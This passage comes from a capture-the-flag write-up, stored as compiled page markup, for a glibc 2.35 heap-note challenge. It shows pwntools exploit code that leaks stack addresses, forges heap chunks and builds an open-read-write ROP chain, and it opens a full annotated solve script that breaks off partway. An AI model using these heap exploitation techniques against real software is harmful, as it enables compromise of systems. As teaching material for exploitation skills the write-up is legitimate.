punctuation\",children:\"(\"}),\"environ\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" p64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"environ \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"2\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" p64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"environ \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" p64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"environ \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:'# When printf(\"\u003e \") happens at the start of the while loop, the buffer is flushed, and our stack address gets printed out first! No newline required.'}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"stack \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" u64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"r\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"recv\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"ljust\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"b'\\\\x00'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,n.jsxs)(e.h2,{id:\"fsop-i-like-rop-\",children:[(0,n.jsx)(e.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#fsop-i-like-rop-\",children:(0,n.jsx)(e.span,{className:\"icon icon-link\"})}),\"FSOP? I Like ROP. \",(0,n.jsx)(\"a\",{name:\"rop\"})]}),`\n`,(0,n.jsxs)(e.p,{children:[\"With a proper stack address, we can now forge a chunk to be given to us located within the stack, and overwrite return pointers to hijack control flow. Ah... but \",(0,n.jsx)(e.em,{children:\"where\"}),\"? The main function doesn\\u2019t actually return, it exits. What we can do is kind of silly, but instead of overwriting main\\u2019s stack frame, we\\u2019ll overwrite the stack frame of whatever lib function calls \",(0,n.jsx)(e.code,{children:\"read()\"}),\". That way, when we return from the read call after allocing a chunk, we instead return to our own control flow.\"]}),`\n`,(0,n.jsx)(e.p,{children:\"If we look at gdb, we can see our backtrace up to the read call:\"}),`\n`,(0,n.jsx)(e.pre,{className:\"language-c\",children:(0,n.jsxs)(e.code,{className:\"language-c code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\\u25BA f \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),\"   \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x7fedd0f14992\"}),\" read\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"18\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  f \",(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),\"   \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x7fedd0e8ccb6\"}),\" _IO_file_underflow\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"390\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  f \",(0,n.jsx)(e.span,{className:\"token number\",children:\"2\"}),\"   \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x7fedd0e8de16\"}),\" _IO_default_uflow\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"54\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  f \",(0,n.jsx)(e.span,{className:\"token number\",children:\"3\"}),\"   \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x7fedd0e63150\"}),\" __vfscanf_internal\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1776\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  f \",(0,n.jsx)(e.span,{className:\"token number\",children:\"4\"}),\"   \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x7fedd0e621c2\"}),\" __isoc99_scanf\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"178\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  f \",(0,n.jsx)(e.span,{className:\"token number\",children:\"5\"}),\"   \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x559d76869498\"}),\" main\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"375\"}),`\n`]})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"So, what we\\u2019re instead going to do is find the offset of \",(0,n.jsx)(e.code,{children:\"_IO_file_underflow\"}),\" return pointer, and forge a chunk to write there. We can reuse the chunks we made from our last arbitrary write, which simplifies things. The offset was computed via some trial and error, but the important feature is that it must be 16 byte aligned, otherwise malloc will crash when trying to alloc from the stack address.\"]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsxs)(e.code,{className:\"language-py code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"stack \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" u64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"r\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"recv\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"ljust\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"8\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"b'\\\\x00'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0x258\"}),\" \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# offset computed in gdb\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# free our forged chunk\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"free\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"2\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# free our victim chunk\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"# write to our forged chunk (which again contains the metadata to victim)\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x230\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"b'T'\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0x208\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" p64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0x211\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" p64\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"stack \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"^\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"heap \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x3320\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"\u003e\u003e\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"12\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"# alloc our victim chunk again.\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"2\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x200\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'xxx'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"# write padding and ROP chain\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"alloc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"3\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x200\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"b'A'\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0xc8\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" rop\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"chain\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"As a final step, let\\u2019s discuss the ROP chain. Seccomp prevents us from calling \",(0,n.jsx)(e.code,{children:\"system\"}),\" or \",(0,n.jsx)(e.code,{children:\"execve\"}),\", so we need to use \",(0,n.jsx)(e.code,{children:\"open\"}),\", \",(0,n.jsx)(e.code,{children:\"read\"}),\", and \",(0,n.jsx)(e.code,{children:\"write\"}),\" to output the flag. The first step is find what can setup these syscalls, luckilly, libc gives us the great function \",(0,n.jsx)(e.code,{children:\"syscall()\"}),\" which we can keep returning to to call these three functions. Next, I need to open \",(0,n.jsx)(e.code,{children:\"flag.txt\"}),\". This is not a complicated problem at all. Remember that 16 byte buffer I allocated during the botcake exploit to prevent consolidation? I can find the fixed offset of that chunk, and write \",(0,n.jsx)(e.code,{children:\"'flag.txt\\\\0'\"}),\" to it, and use that as my buffer for open. Then calling read and write becomes simple register operations.\"]}),`\n`,(0,n.jsx)(e.p,{children:\"pwntools is extremely useful in automating this process.\"}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsxs)(e.code,{className:\"language-py code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"rop \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" ROP\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"libc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"flagoffset \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x55d31ac5f520\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"-\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x55d31ac5c000\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"flag \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" heap \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" flagoffset\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"16\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"output \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" flag \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x20\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"syscall \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" libc\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"address \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"171444\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"print\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"Flag.txt: \"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token builtin\",children:\"hex\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"flag\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"rop\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"call\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'syscall'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"2\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" flag\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# open('flag.txt',0,0)\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"rop\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"call\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'syscall'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"3\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" output\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x100\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"#read(3, buf, 0x100)\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"rop\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"call\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'syscall'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" output\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x100\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"#write(1, buf, 0x100)\"}),`\n`]})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"We can run the entire script and it prints out the flag on remote: \",(0,n.jsx)(e.code,{children:\"ictf{i_guess_the_post_office_couldnt_hide_the_heapnote_underneath_912b123f}\"})]}),`\n`,(0,n.jsxs)(e.h2,{id:\"tldr-\",children:[(0,n.jsx)(e.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#tldr-\",children:(0,n.jsx)(e.span,{className:\"icon icon-link\"})}),\"TLDR \",(0,n.jsx)(\"a\",{name:\"tldr\"})]}),`\n`,(0,n.jsxs)(e.p,{children:[\"Heap Note Challenge with no update, arbitrary chunk size, with glibc2.35, full protections, OWR seccomp, no return, no \",(0,n.jsx)(e.code,{children:\"exit()\"}),\". Use double free and read after free to leak libc and heap, use House of Botcake to do FSOP on stdout to leak environ and get a stack leak. Write over return address of \",(0,n.jsx)(e.code,{children:\"_IO_file_underflow\"}),\" during the read call of a note allocation to ROP to Open, Read, Write chain to get flag.\"]}),`\n`,(0,n.jsxs)(e.h2,{id:\"full-script-annotated-\",children:[(0,n.jsx)(e.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#full-script-annotated-\",children:(0,n.jsx)(e.span,{className:\"icon icon-link\"})}),\"Full Script (Annotated) \",(0,n.jsx)(\"a\",{name:\"script\"})]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-py\",children:(0,n.jsxs)(e.code,{className:\"language-py code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"#!/usr/bin/env python3\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"from\"}),\" pwn \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"import\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"*\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"exe \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" ELF\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"./vuln_patched\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"libc \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" ELF\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"./libc.so.6\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"context\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"binary \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),` exe\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"# this makes tmux split vertically when debugging\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"context\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"terminal \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'tmux'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'splitw'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'-f'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'-h'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"# I was going to beat safelinking another way, which is why this became a global\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"heap \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0x0\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"# pwninit\\u2019s stub conn() function. Call with `python3 solve.py LOCAL` or no args to change which.\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"conn\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" args\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"LOCAL\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        r \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" process\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),\"exe\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"path\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"else\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        r \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" remote\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:'\"mailman.chal.imaginaryctf.org\"'}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"1337\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),` r\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Safelinking deobfuscation helper\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"deobfuscate\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"val\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    mask \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0xfff\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"\u003c\u003c\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"52\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"while\"}),\" mask\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        v \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" val \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"\u0026\"}),` mask\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        val \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"^\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"v \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"\u003e\u003e\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"12\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        mask \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"\u003e\u003e\"}),(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"12\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),` 